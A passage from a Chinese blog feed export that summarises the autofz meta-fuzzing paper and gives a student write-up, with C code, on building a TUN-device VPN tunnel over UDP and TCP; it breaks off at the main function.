<li>每个工作负载的动态模糊器组成<br>  在整个模糊测试过程中，autofz 不需要使用一组静态模糊器。从本质上讲，除了持续 选择性能良好的模糊器外，autofz 还能给那些未被 选中但后来发现适合特定工作负载的模糊器第二次 机会。</li>
<li>自动和非侵入方法<br>  可自动为任何给定的目标选择最合适的模糊器，降低了使用者的门槛。</li>
<li>高效的资源调度算法<br>  可确保单个模糊器的性 能，并将计算资源高效地分配给选定的模糊器，有助于利用单个fuzzer的最大优势，同时最大限度地发挥多个不同fuzzer的协作效果。此外，autofz 首先强调资源调度是影响协作效率的另一个重要因素。</li>
</ul>
<h2 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h2><h3 id="Fuzzing-benchmark"><a href="#Fuzzing-benchmark" class="headerlink" title="Fuzzing benchmark"></a>Fuzzing benchmark</h3><p>模糊测试基准<br>使用模糊测试套件 Fuzzer Test Suite，FTS，以及UNIFuzz</p>
<h3 id="Collaborative-fuzzing"><a href="#Collaborative-fuzzing" class="headerlink" title="Collaborative fuzzing"></a>Collaborative fuzzing</h3><p>协作式模糊测试试图通过协调多个 不同类型的模糊器与种子同步（见下文）来提高模 糊测试活动的性能。这样做能提高代码覆盖率<br>![Pasted image 20230919164351.png](autofz\Pasted image 20230919164351.png)</p>
<h3 id="Seed-synchronization"><a href="#Seed-synchronization" class="headerlink" title="Seed synchronization"></a>Seed synchronization</h3><p>种子同步，将其他fuzzer的有趣的种子，同步到无法向下执行的fuzzer中。</p>
<h2 id="autofz概述"><a href="#autofz概述" class="headerlink" title="autofz概述"></a>autofz概述</h2><p>autofz 旨在解决 选择问题。其关键思路是根据运行时 的模糊器评估结果，为每个工作负载动态部署不同的模 糊器集。为此，autofz 由两个重要部分组成：准备阶段和聚焦阶段。</p>
<ul>
<li><p>准备阶段<br>  准备阶段在运行时定期监控单个模糊器的进度（称为趋势），并 将其作为选择下一组模糊器的决策反馈。由于工作量在 模糊处理过程中会发生变化，因此准备阶段有助于 autofz 适应变化的趋势。有了准备阶段，重 点阶段就能确定所选模糊器的优先级，并为任何目标二 进制文件取得最佳结果。<br>  autofz会在准备阶段的每一轮同步所有fuzzer的种子。为所有的fuzzer分配相同数量的资源，每个模糊器在很短的时间 间隔内轮流运行，直到遇到退出条件。<br>  autofz 利用基线 模糊器的评估结果 AFL 位图来衡量所有模糊器的趋势。<br>  考虑到趋势，autofz 会选择基线模糊器的一个子集 以及资源分配元数据，决定每个模糊器在当前工作量下的优先级 （4）。<br>  在过渡到FOUCS阶段之前进行种子同步 ( 6 , 7 ) 可以让所选模糊器共享准 备阶段产生的独特测试用例</p>
</li>
<li><p>FOUCS阶段<br>  按照资源分配元数据逐一运行选 定的模糊器。每个模糊器都有一个特定的 CPU 时 间窗口来取得进展 ( 8 )。在此阶段目标是实现最高性能，而不是公平比较。<br>  因此，在一个fuzzer执行后，我们会同步种子，让其余fuzzer探索其他fuzzer未发现的路径。当分配的资源全部耗尽时， 它就会回到准备阶段并测量趋势 ( 9 )。这两个阶段 之间的执行流一直持续到模糊执行结束（例如 24 小时）。</p>
</li>
</ul>
<h3 id="Preparation-Phase"><a href="#Preparation-Phase" class="headerlink" title="Preparation Phase"></a>Preparation Phase</h3><p>![Pasted image 20230919183922.png](autofz\Pasted image 20230919183922.png)<br>Preparation phase的目标是适当地选择那些能说明强烈趋势的 模糊器，以帮助Foucs phase实现最高性能。</p>
<h4 id="Dynamic-time-in-preparation-phase"><a href="#Dynamic-time-in-preparation-phase" class="headerlink" title="Dynamic time in preparation phase"></a>Dynamic time in preparation phase</h4><p>为了适应不断变化的工作量并找到最合适的模糊器，准备阶段应评估所有基线模糊器， 直到可以捕捉到强烈的趋势。但是，如果准备阶段花费的时间过长，就会浪费宝贵的测量资源。虽然 autofz 也可以利用准备阶段的时间来取得进展，但它可以通过 更早、更长地优先选择模糊器来实现更好的性能。相反 ，如果准备时间太短，则很难捕捉模糊器的明确趋势。 这就会使 autofz 不恰当地优先处理一组次优模糊器， 贸然将宝贵的资源分配给它们。但是准备时间是未知的，autofz采用动态准备时间，采用的算法是AIMD(Additive-Increase&#x2F;Multiplicative- Decrease)。TCP拥塞控制采用的算法。</p>
<h4 id="Early-exit-and-threshold"><a href="#Early-exit-and-threshold" class="headerlink" title="Early exit and threshold"></a>Early exit and threshold</h4><p>如果 autofz 能够更早地找到具有强烈趋势的模糊器，就可以将 剩余资源分配给重点阶段，为了避免减少准 备时间、过早做出决定的缺点，autofz 需要一个明 确的强趋势指标。<br>利用位图的 峰值差（diffpeak ），即表现最好和最差模糊器之间 的差值。检测到早期退出条件后，autofz 会立即进 入聚焦阶段。<br>提前退出所产生的剩余时间 将分配给聚焦阶段，这样它就能更早更长时间地执行所选模糊器。引入了一个阈值（以 θ 表示） ，如果峰值差大于 θ，则允许准备阶段提前退出。<br>![Pasted image 20230919185441.png](autofz\Pasted image 20230919185441.png)</p>
<h4 id="Trend-evaluation"><a href="#Trend-evaluation" class="headerlink" title="Trend evaluation"></a>Trend evaluation</h4><p>在算法2中，利用位图操作来衡 量单个模糊器的趋势。为此，autofz 会测量每个模 糊器在准备阶段探索过的唯一路径。由于在准备阶 段之前进行了种子同步，因此每个模糊器位图中的 唯一条目都可以代表其自身的贡献。<br>将所有模 糊器在准备阶段探索过的共同路径显示为 b∩ （第 5行），从单个模糊器的位图中减去它，这样就可以 根据在准备阶段发现的唯一路径来衡量每个模糊器的贡 献。</p>
<h4 id="Resource-assignment"><a href="#Resource-assignment" class="headerlink" title="Resource assignment"></a>Resource assignment</h4><p>如果某些模糊器表现出色，就会暂时为它们 分配更多资源。Autofz 可以加速性能良好的模 糊器，而将其他模糊器降级。Autofz 引入了新颖的策 略，允许在选定的模糊器之间高效分配资源。由于资源 分配的多样性，autofz 可以同时利用单个模糊器和协作模糊。autofz 支持两种资源分配方式。<br>#💡？？？ 是不是可以在资源分配上做文章？</p>
<ul>
<li>prioritizes the best  — 最佳优先级<br>  优先考虑最好的模糊器，将所有资 源分配给排名最靠前的模糊器，只有当某个模糊器的性 能明显优于其他所有基线模糊器时，才会启用该策略。<br>  算法2中 Exitearly作为这种情况的一种信号。当提前退出发生时，首先要找到发现最独特路径的 模糊器集合（max_ fuzzers）（第 8-13 行）。</li>
<li>proportionally distribute resources based on the trends of each fuzzer — 根据每个模糊器的发展趋势按比例分配资源<br> 这是很好理解的一种资源分配策略，能者多劳，获得资源就越多。<br> 在这 种情况下，就会根据模糊器的贡献，按比例向它们 分配资源（第 16 行），从而实现协同模糊的优势。<strong>autofz可以在选定的模糊器之间分配资源。</strong></li>
</ul>
<h4 id="Putting-them-all-together"><a href="#Putting-them-all-together" class="headerlink" title="Putting them all together"></a>Putting them all together</h4><p>算法 1 所述，准备阶段的每一轮都需要 基线模糊器 (F)、它们的位图 (B)、为当前模糊器分配的时间预算 (C)、它们的位图 (D)、为当前模糊器分配的时间预算 (E)。 轮（Tprep ），以及检测早期退出事件的阈值（θ ）cur 因此，准备阶段会返回 Exitearly ，表明是否发生提前退出， 并在发生提前退出时返回非零值的 Tremain 。此外，它还会返回 RA 资源分配元数据。属于 F 的每个模糊器轮流在很短的时间间隔（30 秒或 Tremain ）内运行。在对 F 中的所有模糊器进行评估之后，准备阶段会检查峰值差是否大于 θcur ，并提前退出。如果条件满足，则运行模糊器。但是，如果差异仍低于 阈值 θcur ，则准备阶段会在另一个较短的时间间隔内运 行每个模糊器。准备阶段将重复这一过程，直到观察到 较大的覆盖率差异或耗尽预定的时间预算（Tprep ）。<br>为每个模糊器分配较短的时间间隔不会显著提高autofz的性能。因为没fuzzer之间的切换与系统中进城切换一样，需要保存上下文，这也会浪费时间。这里限定的执行时间为30s。</p>
<p>对于多核，并行运行所有模糊器，并将其分配给不同的模 糊器。 平均分配 CPU 资源。RUN_FUZZERS_PARALLEL(F, T, c) 运 行所有模糊器 f∈F T 秒，每个模糊器分配 c 个 CPU 内 核。</p>
<h3 id="Foucs-Phase"><a href="#Foucs-Phase" class="headerlink" title="Foucs Phase"></a>Foucs Phase</h3><p>算法4描述了autofz的foucs phase阶段如何利用同一轮准备生成的信息运行选定的fuzzer。模糊器（F）和资源分配元数据（RA）被传递到 Foucs Phase。因为每个模糊器的时间预算本轮允许消耗的资源是根据 RA 计算的，不会分配给在准备阶段未被选中的模糊器。<br>此外，Foucs Phase需要 T focus ，它每一轮都不同，取决于准备阶段在 这一轮中何时退出。请注意，当准备阶段提前退出时，剩余的时间预算将分配给重点阶段，使其能够更长时间地利用强趋势。Foucs Phase首先计算总的时间预算（第 3 行），然后根据以下条件对模糊器进行排序：<br>先运行性能良好的模糊器（第 4 行）。然后，计算基线模糊器的时间预算 (第 6 行），如果分配的预算不为零（第 7-8 行）， 则运行模糊器。请注意，每执行一个模糊器，Foucs phase都会同步种子和位图（第 9 行），以累计所有选定模糊器的进度。<br>如果在准备阶段选择了多个模 糊器，种子同步将允许每个模糊器发现其他模糊器未探索过的独特路径。<br>对于多核版本，我们首先计算应分配多少个内核 c 给下列模糊器根据资源分配 RA 运行每个模糊器（第 11 行）， 然后根据结果并行运行所有模糊器（第 12 行）。<br>![Pasted image 20230919193004.png](autofz\Pasted image 20230919193004.png)</p>
<h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><p>autofz 包含 6.2K 行 Python3 代码（4.8K 行用于主 框架，1.4K 行用于模糊器 API）。为了根据 资源分配情况限制所选模糊器的资源使用，使用了 cgroups ，它可以对进程进行分级管理，并限制每个组的资源使用。</p>
<ul>
<li><code>cgroups</code>（控制组）是Linux内核的一个功能，它允许进程被组织成分层的组，并为这些组分配资源。这种技术主要用于资源限制、优先级调整、资源计量和资源隔离。</li>
</ul>
<h3 id="AFL-bitmap-measuring-coverage-of-fuzzers"><a href="#AFL-bitmap-measuring-coverage-of-fuzzers" class="headerlink" title="AFL bitmap measuring coverage of fuzzers"></a>AFL bitmap measuring coverage of fuzzers</h3><p>在 autofz 中，每个 基线模糊器都使用其原始设计的模糊算法，不涉及任何实现变更。因此，在这两个阶段中，每个模糊器都可以 根据其内部指标和算法生成不同的有趣输入。不过，如第 4.1 节所述，autofz 需要重新获取所有基线模糊器的 AFL 位图，以便公平地比较趋势。具体来说，autofz 使用每个模糊器认为有趣的不同输入调用 AFL 仪表二 进制。每个模糊器都可以将有趣的输入作为文件保存在不同的目录中。因此，当新的模糊器集成到 autofz 时 ， autofz 就 应 该 知 道 这 些 信 息 。 例 如 ， Angora 将 “queue”、”crashes “和 “hangs “配置为有趣的输入目录 。因此，在准备阶段，一旦在指定目录中创建了新文件 ，autofz 就会调用带有新输入的 AFL 仪器目标，并测 量 Angora 的 AFL 位图覆盖范围。</p>
<h3 id="API-for-integration"><a href="#API-for-integration" class="headerlink" title="API for integration"></a>API for integration</h3><p>实现以下 python API 的任何单个模糊器都可以集成到 autofz 中。 1. Start &#x2F; Stop 2. Scale up &#x2F; down (for parallel mode).<br>启动每个模糊器需要不同的参数和文件目录。通过启动和停止 API，autofz 可以了解如何使用适当的参数启动和停止每个模糊器。 此外，每个模糊器都应实现 Scale Up 和 Down API，以 利用多核资源。例如，AFL 有主模式和从模式。因此， 用户需要实施 Scale Up API 来启动更多的从实例，而不 是主实例。</p>
<h3 id="Multi-core-support"><a href="#Multi-core-support" class="headerlink" title="Multi-core support"></a>Multi-core support</h3><p> autofz 能够利用多个内核。对于多核实现，我们同时 运行 在准备阶段和聚焦阶段，autofz 都会对模糊器进行实例 化。例如，如果我们有 N 个内核，autofz 会使用针对 模糊器 f 的 Scale Up API 实例化 ⌈N ×RA[ f ]⌉个进程。之 后 autofz 利用 cgroups 将分配给所生成模糊器实例的 CPU 资源总量精确限制为 N × RA[ f ]。</p>
<h2 id="Evaluation"><a href="#Evaluation" class="headerlink" title="Evaluation"></a>Evaluation</h2><p>实验部分，作者用实验数据强调了autofz目前的优势，与其存在的巨大意义，建议直接看原文。</p>
<h2 id="Discussion"><a href="#Discussion" class="headerlink" title="Discussion"></a>Discussion</h2><ul>
<li>Autofz 利用 AFL 位图来比较运行时趋势，这有利于寻 求最大路径覆盖率的模糊器。虽然覆盖率是模糊处理中最常用、最明确的进度指标，但依赖单一指标可能会导致与使用覆盖率以外指标的各种模糊器进行不公平的比较 [16, 39, 46-48]。因此，除路径覆盖率外，支持多种指标可以 在资源分配方面实现公平性和更好的效率。例如，可以使用不同的指标来打破平局，尤其是在一种指标已经饱和的情况 下。</li>
<li>消除不良模糊器。在对特定目标进行模糊测试的整 个过程中，某个模糊器可能表现不佳（例如图 3 中 显示的对 exiv2 进行模糊测试的 Radamsa）。不过 ，在准备阶段，所有基线模糊器都会分配到相同数量的资源，以测量运行时趋势。如果能及时将性能较差的模糊器从基线中剔除，autofz 就能实现更高的资源利用率。</li>
</ul>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>本文介绍了一种元模糊器 autofz，它可提供细粒度 和非侵入式模糊器协调。我们的评估结果表明，在没有任何先验知识的情况下自动组成模糊器是有效的。通过观察运行时模糊器的趋势并适当分配计算 资源，autofz 不仅战胜了单个模糊器，还战胜了最 先进的协同模糊方法。我们希望 autofz 能够 弥补 新模糊器的开发与有效部署之间的差距。</p>
]]></content>
      <categories>
        <category>security, paper</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-LFI</title>
    <url>/2020/10/08/buuoj-LFI/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>LFI</tag>
      </tags>
  </entry>
  <entry>
    <title>VPN</title>
    <url>/2021/07/21/VPN/</url>
    <content><![CDATA[<p>操作系统大作业</p>
<span id="more"></span>

<h1 id="一、基于UDP-x2F-TCP的VPN"><a href="#一、基于UDP-x2F-TCP的VPN" class="headerlink" title="一、基于UDP&#x2F;TCP的VPN"></a>一、基于UDP&#x2F;TCP的VPN</h1><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><ul>
<li>tun 接口</li>
<li>VPN搭建</li>
<li>隧道转发数据包</li>
</ul>
<h3 id="tun-设备"><a href="#tun-设备" class="headerlink" title="tun 设备"></a>tun 设备</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>tun(&#x2F;tap) 是 Linux 内核 2.4.x 版本之后实现的虚拟网络设备，不同于物理网卡靠硬件网卡实现，tap&#x2F;tun 虚拟网卡完全由软件来实现，功能和硬件实现完全没有差别，它们都属于网络设备，都可以配置 IP，都归 Linux 网络设备管理模块统一管理。</p>
<h4 id="TUN-工作机制"><a href="#TUN-工作机制" class="headerlink" title="TUN 工作机制"></a><strong>TUN 工作机制</strong></h4><p>TUN 设备是一种虚拟网络设备，通过此设备，程序可以方便得模拟网络行为。其工作方式如图</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707171052692.png" alt="image-20210707171052692" style="zoom:80%;">

<p>Linux Tun&#x2F;Tap驱动程序为应用程序提供了两种交互方式：虚拟网络接口和字符设备&#x2F;dev&#x2F;net&#x2F;tun。写入字符设备&#x2F;dev&#x2F;net&#x2F;tun的数据会发送到虚拟网络接口中；发送到虚拟网络接口中的数据也会出现在该字符设备上。</p>
<p>应用程序可以通过标准的Socket API向Tun&#x2F;Tap接口发送IP数据包，就好像对一个真实的网卡进行操作一样。除了应用程序以外，操作系统也会根据TCP&#x2F;IP协议栈的处理向Tun&#x2F;Tap接口发送IP数据包或者以太网数据包，例如ARP或者ICMP数据包。Tun&#x2F;Tap驱动程序会将Tun&#x2F;Tap接口收到的数据包原样写入到&#x2F;dev&#x2F;net&#x2F;tun字符设备上，处理Tun&#x2F;Tap数据的应用程序如VPN程序可以从该设备上读取到数据包，以进行相应处理。</p>
<p>应用程序也可以通过&#x2F;dev&#x2F;net&#x2F;tun字符设备写入数据包，这种情况下该字符设备上写入的数据包会被发送到Tun&#x2F;Tap虚拟接口上，进入操作系统的TCP&#x2F;IP协议栈进行相应处理，就像从物理网卡进入操作系统的数据一样。</p>
<h3 id="搭建-VPN"><a href="#搭建-VPN" class="headerlink" title="搭建 VPN"></a>搭建 VPN</h3><p><strong>其工作流程为：</strong></p>
<p>通过程序可以从<code>/dev/net/tun</code>字符设备中读取<code>(read)</code>或者写入<code>(write)</code>数据，再通过将Tun结合物理网络设备使用,我们可以创建一个点对点的隧道。如下图所示，左边主机上应用程序发送到Tun虚拟设备上的IP数据包被VPN程序通过字符设备接收，然后再通过一个UDP隧道发送到右端的VPN服务器上，VPN服务器将隧道负载中的原始IP数据包写入字符设备，这些IP包就会出现在右侧的Tun虚拟设备上，最后通过操作系统协议栈和socket接口发送到右侧的应用程序上。</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707180318134.png" alt="image-20210707180318134" style="zoom:80%;">

<h3 id="通过隧道发送-x2F-接收包"><a href="#通过隧道发送-x2F-接收包" class="headerlink" title="通过隧道发送&#x2F;接收包"></a>通过隧道发送&#x2F;接收包</h3><blockquote>
<p>当隧道建立后，如何通过隧道发送&#x2F;接收数据包是需要解决的问题</p>
</blockquote>
<ul>
<li><p>通过隧道发送</p>
<p>通过TUN接口获得一个IP包—&gt;加密（或者验证)—&gt;把它作为载荷发送到隧道另一端</p>
</li>
<li><p>通过隧道接收</p>
<p>通过隧道接收载荷—&gt;解密并验证数据—&gt;获得真实的包数据—&gt;把包数据写到TUN接口。</p>
</li>
</ul>
<p>如下图所示</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707214533426.png" alt="image-20210707214533426"></p>
<p><strong>监听socket和tun0网卡，然后转发数据包</strong></p>
<p>每一个隧道应用都有两种接口: socket接口、TUN接口，两种接口都需要监听，需要在两种接口间转发数据。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210708092049656.png" alt="image-20210708092049656"></p>
<h2 id="程序实现"><a href="#程序实现" class="headerlink" title="程序实现"></a>程序实现</h2><p>在编写程序之前需要做一些准备，程序流程图如下</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210708092000296.png" alt="image-20210708092000296" style="zoom:80%;">

<p>从图中可知程序中主要包含四个部分</p>
<ul>
<li>创建tun0网卡</li>
<li>客户端和服务器socket连接</li>
<li>转发来自tunnel和tun0数据</li>
<li>主程序，监听接口阻塞进程</li>
</ul>
<p><code>vpnclient</code> 和 <code>vpnserver</code> 程序是 VPN 隧道的两端。它们通过套接字使用  UDP 相互通信。客户端和服务器之间的虚线描绘了 VPN 隧道的路径。 VPN 客户端和服务器程序通过 TUN 接口连接到主机系统，通过它他们做两件事：</p>
<p>（1）从主机系统获取 IP 数据包，因此数据包可以通过隧道发送</p>
<p>（2）从隧道获取 IP 数据包，然后将其转发到托管系统，该系统会将数据包转发到其最终目的地。</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707184214724.png" alt="image-20210707184214724" style="zoom: 80%;">

<h3 id="创建tun网卡"><a href="#创建tun网卡" class="headerlink" title="创建tun网卡"></a>创建tun网卡</h3><p>在上图中可以看到客户端和服务器都需要一个tun网卡，所以需要在两台主机上都创建一个tun0网卡，从而形成<code>tunnel</code>，实现通信</p>
<p>使用命令创建tun网卡</p>
<pre><code class="hljs shell">ip tuntap add dev tun0 mode tun</code></pre>

<p>当上面的命令执行完再使用<code>ifconfig -a</code>就可以看到刚刚创建的<code>tun0</code>网卡，再使用如下的命令对其配置</p>
<pre><code class="hljs apache"><span class="hljs-attribute">ifconfig</span> tun0 <span class="hljs-number">192.168.53.5</span>/<span class="hljs-number">24</span> up</code></pre>

<p>但是这里为了程序执行方便，直接在程序中创建虚拟网卡</p>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">createTunDevice</span><span class="hljs-params">()</span> &#123;   <span class="hljs-comment">// 创建 tun0 网卡 </span>
   <span class="hljs-type">int</span> tunfd;
   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifreq</span> <span class="hljs-title">ifr</span>;</span>
   <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ifr));
    
   ifr.ifr_flags = IFF_TUN | IFF_NO_PI;   <span class="hljs-comment">// tun设备不包含以太网头部</span>
   tunfd = open(<span class="hljs-string">&quot;/dev/net/tun&quot;</span>, O_RDWR);  <span class="hljs-comment">// 打开文件</span>
   ioctl(tunfd, TUNSETIFF, &amp;ifr);         <span class="hljs-comment">// 打开设备</span>
   <span class="hljs-keyword">return</span> tunfd;
    <span class="hljs-comment">// 该函数执行完后 执行命令ifconfig tunX 192.168.53.5/24 up 为tun网卡设置IP并开启</span>
&#125;</code></pre>

<h3 id="socket连接"><a href="#socket连接" class="headerlink" title="socket连接"></a>socket连接</h3><p><code>VPN server</code></p>
<h4 id="UDP连接"><a href="#UDP连接" class="headerlink" title="UDP连接"></a>UDP连接</h4><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">initUDPServer</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-type">int</span> sockfd;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server</span>;</span>
    <span class="hljs-type">char</span> buff[<span class="hljs-number">100</span>];

    <span class="hljs-built_in">memset</span>(&amp;server, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(server));
    server.sin_family = AF_INET;       <span class="hljs-comment">// 服务器地址类型为IPV4            </span>
    server.sin_addr.s_addr = htonl(INADDR_ANY);  <span class="hljs-comment">//服务器IP</span>
    server.sin_port = htons(PORT_NUMBER);        <span class="hljs-comment">// 端口号</span>

    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);  <span class="hljs-comment">//创建UDP的套接字</span>
    bind(sockfd, (<span class="hljs-keyword">struct</span> sockaddr*) &amp;server, <span class="hljs-keyword">sizeof</span>(server));  <span class="hljs-comment">// socket绑定地址和端口</span>
    <span class="hljs-comment">// 等待连接</span>
    bzero(buff, <span class="hljs-number">100</span>);   <span class="hljs-comment">//清空缓冲区</span>
    <span class="hljs-type">int</span> peerAddrLen = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in); <span class="hljs-comment">//初始化结构体</span>
    <span class="hljs-type">int</span> len = recvfrom(sockfd, buff, <span class="hljs-number">100</span>, <span class="hljs-number">0</span>,(<span class="hljs-keyword">struct</span> sockaddr *) &amp;peerAddr, &amp;peerAddrLen);      <span class="hljs-comment">// 等待接收数据 </span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connected with the client: %s\n&quot;</span>, buff);
    <span class="hljs-keyword">return</span> sockfd;
&#125;</code></pre>

<p><code>VPN client</code></p>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">connectToUDPServer</span><span class="hljs-params">()</span>&#123;    <span class="hljs-comment">//创建socket连接 连接到vpn服务器</span>
    <span class="hljs-type">int</span> sockfd;
    <span class="hljs-type">char</span> *hello=<span class="hljs-string">&quot;Hello&quot;</span>;
	<span class="hljs-comment">//指定服务器的地址结构</span>
    <span class="hljs-built_in">memset</span>(&amp;peerAddr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(peerAddr));
    peerAddr.sin_family = AF_INET;      <span class="hljs-comment">// 服务器地址类型为IPV4   </span>
    peerAddr.sin_port = htons(PORT_NUMBER);
    peerAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);
  
    sendto(sockfd, hello, <span class="hljs-built_in">strlen</span>(hello), <span class="hljs-number">0</span>,    <span class="hljs-comment">// 连接服务器后发送一个消息 hello</span>
                (<span class="hljs-keyword">struct</span> sockaddr *) &amp;peerAddr, <span class="hljs-keyword">sizeof</span>(peerAddr));
    <span class="hljs-keyword">return</span> sockfd;
&#125;</code></pre>

<h4 id="TCP连接"><a href="#TCP连接" class="headerlink" title="TCP连接"></a>TCP连接</h4><p><code>VPN server</code></p>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">initTCPServer</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sa_server</span>;</span>
    <span class="hljs-type">int</span> listen_sock;

    listen_sock= socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    CHK_ERR(listen_sock, <span class="hljs-string">&quot;socket&quot;</span>);
    <span class="hljs-built_in">memset</span> (&amp;sa_server, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(sa_server));
    sa_server.sin_family      = AF_INET;
    sa_server.sin_addr.s_addr = INADDR_ANY;
    sa_server.sin_port        = htons (<span class="hljs-number">4433</span>);
    <span class="hljs-type">int</span> err = bind(listen_sock, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;sa_server, <span class="hljs-keyword">sizeof</span>(sa_server));
    CHK_ERR(err, <span class="hljs-string">&quot;bind&quot;</span>);
    err = listen(listen_sock, <span class="hljs-number">5</span>);
    CHK_ERR(err, <span class="hljs-string">&quot;listen&quot;</span>);
    <span class="hljs-keyword">return</span> listen_sock;
&#125;</code></pre>

<p><code>VPN client</code></p>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">initTCPClient</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* hostname, <span class="hljs-type">int</span> port)</span>
&#123;
   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server_addr</span>;</span>

   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hostent</span>* <span class="hljs-title">hp</span> =</span> gethostbyname(hostname);
	<span class="hljs-comment">// 创建TCP socket</span>
   <span class="hljs-type">int</span> sockfd= socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

   <span class="hljs-comment">// 填写ip 端口 和协议信息</span>
   <span class="hljs-built_in">memset</span> (&amp;server_addr, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(server_addr));
   <span class="hljs-built_in">memcpy</span>(&amp;(server_addr.sin_addr.s_addr), hp-&gt;h_addr, hp-&gt;h_length);
   server_addr.sin_port   = htons (port);
   server_addr.sin_family = AF_INET;

   <span class="hljs-comment">// 连接目的地址</span>
   connect(sockfd, (<span class="hljs-keyword">struct</span> sockaddr*) &amp;server_addr,
           <span class="hljs-keyword">sizeof</span>(server_addr));
   <span class="hljs-keyword">return</span> sockfd;
&#125;</code></pre>



<h3 id="转发端口数据"><a href="#转发端口数据" class="headerlink" title="转发端口数据"></a>转发端口数据</h3><p>客户端程序和服务器端程序都需要以下两个库函数</p>
<blockquote>
<p>int sendto(int s, const void * msg, int len, unsigned int flags, const struct sockaddr * to, int tolen);</p>
<p>函数说明：sendto() 用来将数据由指定的socket 传给对方主机. 参数s 为已建好连线的socket, 如果利用UDP协议则不需经过连线操作. 参数msg 指向欲连线的数据内容, 参数flags 一般设0,  参数to 用来指定欲传送的网络地址, 结构sockaddr 请参考bind(). 参数tolen 为sockaddr 的结果长度.</p>
<p>int recvfrom(int s, void *buf, int len, unsigned int flags, struct sockaddr *from,int *fromlen);</p>
<p>函数说明：recv()用来接收远程主机经指定的socket 传来的数据, 并把数据存到由参数buf 指向的内存空间, 参数len 为可接收数据的最大长度. 参数flags 一般设0,  参数from 用来指定欲传送的网络地址, 结构sockaddr 请参考bind(). 参数fromlen 为sockaddr 的结构长度.</p>
</blockquote>
<p>从tun0接收数据转发到tunnel</p>
<pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">tunSelected</span><span class="hljs-params">(<span class="hljs-type">int</span> tunfd, <span class="hljs-type">int</span> sockfd)</span>&#123;
    <span class="hljs-type">int</span>  len;
    <span class="hljs-type">char</span> buff[BUFF_SIZE];  <span class="hljs-comment">//定义接收数的缓冲区</span>

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got a packet from TUN\n&quot;</span>);
    bzero(buff, BUFF_SIZE);  <span class="hljs-comment">// 清空缓冲区</span>
    len = read(tunfd, buff, BUFF_SIZE);   <span class="hljs-comment">// 读取来自tun0网卡的数据，保存在缓冲区中</span>
    sendto(sockfd, buff, len, <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;peerAddr, <span class="hljs-keyword">sizeof</span>(peerAddr));
    <span class="hljs-comment">// 通过socket发送数据</span>
&#125;</code></pre>

<p>从tunnel接收数据转发到tun0</p>
<pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">socketSelected</span> <span class="hljs-params">(<span class="hljs-type">int</span> tunfd, <span class="hljs-type">int</span> sockfd)</span>&#123;
    <span class="hljs-type">int</span>  len;
    <span class="hljs-type">char</span> buff[BUFF_SIZE];
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got a packet from the tunnel\n&quot;</span>);
    bzero(buff, BUFF_SIZE);
    len = recvfrom(sockfd, buff, BUFF_SIZE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// 接收数据至buff，保存数据的长度</span>
    write(tunfd, buff, len);								<span class="hljs-comment">// 通过write发送到tun0</span>
&#125;</code></pre>



<h3 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h3><p>主要作用，调用之前的函数，创建tun0网卡；建立基于udp的socket连接；循环接收数据</p>
<p>用到的库函数</p>
<blockquote>
